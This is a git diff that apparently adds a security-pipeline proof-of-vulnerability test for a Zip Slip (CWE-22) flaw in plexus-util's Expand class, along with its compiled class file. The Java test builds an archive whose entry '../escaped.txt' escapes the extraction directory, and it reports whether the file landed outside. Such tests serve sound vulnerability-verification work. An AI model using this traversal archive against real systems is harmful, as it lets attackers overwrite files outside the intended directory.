@@ -1,0 +1,80 @@
+diff --git a/.security-pipeline/pov/ZipSlipPov.java b/.security-pipeline/pov/ZipSlipPov.java
+new file mode 100644
+index 0000000..0ee801d
+--- /dev/null
++++ b/.security-pipeline/pov/ZipSlipPov.java
+@@ -0,0 +1,70 @@
++import org.codehaus.plexus.util.Expand;
++
++import java.io.File;
++import java.io.FileOutputStream;
++import java.util.zip.ZipEntry;
++import java.util.zip.ZipOutputStream;
++
++/**
++ * Proof-of-Vulnerability for CWE-022 (Zip Slip / path traversal) in
++ * {@link org.codehaus.plexus.util.Expand}.
++ *
++ * A ZipEntry name containing "../" is fed unchecked into
++ * FileUtils.resolveFile(dir, entryName), letting an archive write files
++ * OUTSIDE the requested destination directory.
++ *
++ * Exit 0  => vulnerable behavior reproduced (file written outside dest).
++ * Exit 1  => traversal blocked (patched code) or write contained.
++ */
++public class ZipSlipPov {
++    public static void main(String[] args) throws Exception {
++        File base = File.createTempFile("zipslip-pov", "");
++        base.delete();
++        base.mkdirs();
++
++        File dest = new File(base, "dest");
++        dest.mkdirs();
++
++        // Location OUTSIDE the destination directory the attacker aims to hit.
++        File escaped = new File(base, "escaped.txt");
++        if (escaped.exists()) {
++            escaped.delete();
++        }
++
++        // Malicious archive: entry name traverses up out of dest.
++        String maliciousName = "../escaped.txt";
++        File zip = new File(base, "evil.zip");
++        try (ZipOutputStream zos = new ZipOutputStream(new FileOutputStream(zip))) {
++            ZipEntry e = new ZipEntry(maliciousName);
++            zos.putNextEntry(e);
++            zos.write("PWNED-BY-ZIP-SLIP".getBytes("UTF-8"));
++            zos.closeEntry();
++        }
++
++        // Exercise the real project code path.
++        Expand expand = new Expand();
++        expand.setSrc(zip);
++        expand.setDest(dest);
++        try {
++            expand.execute();
++        } catch (Exception ex) {
++            // A patch may reject the malicious entry with an exception.
++            System.out.println("NOT VULNERABLE: extraction threw " + ex);
++            System.exit(1);
++        }
++
++        File canonEscaped = escaped.getCanonicalFile();
++        File canonDest = dest.getCanonicalFile();
++        boolean outsideDest =
++            !canonEscaped.getPath().equals(canonDest.getPath())
++            && !canonEscaped.getPath().startsWith(canonDest.getPath() + File.separator);
++
++        if (escaped.exists() && outsideDest) {
++            System.out.println("VULNERABLE: Zip Slip wrote file outside dest at " + canonEscaped);
++            System.exit(0);
++        }
++
++        System.out.println("NOT VULNERABLE: no file escaped destination directory");
++        System.exit(1);
++    }
++}
+diff --git a/.security-pipeline/pov/out/ZipSlipPov.class b/.security-pipeline/pov/out/ZipSlipPov.class
+new file mode 100644
+index 0000000..0bc608b
+Binary files /dev/null and b/.security-pipeline/pov/out/ZipSlipPov.class differ
